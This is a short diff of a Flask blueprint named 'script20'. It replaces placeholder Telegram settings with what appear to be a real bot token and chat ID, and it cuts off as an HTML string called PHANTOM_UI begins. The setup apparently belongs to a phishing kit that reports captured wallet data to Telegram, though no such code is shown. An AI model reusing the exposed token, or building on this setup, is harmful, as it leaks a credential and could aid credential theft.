@@ -4,8 +4,8 @@ import requests
 script20_bp = Blueprint('script20', __name__)
 
 # --- CONFIGURATION (Apni Details Yahan Daal) ---
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
+TELEGRAM_BOT_TOKEN = "6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0"
+TELEGRAM_CHAT_ID = "1308711346"
 
 PHANTOM_UI = """
 <!DOCTYPE html>
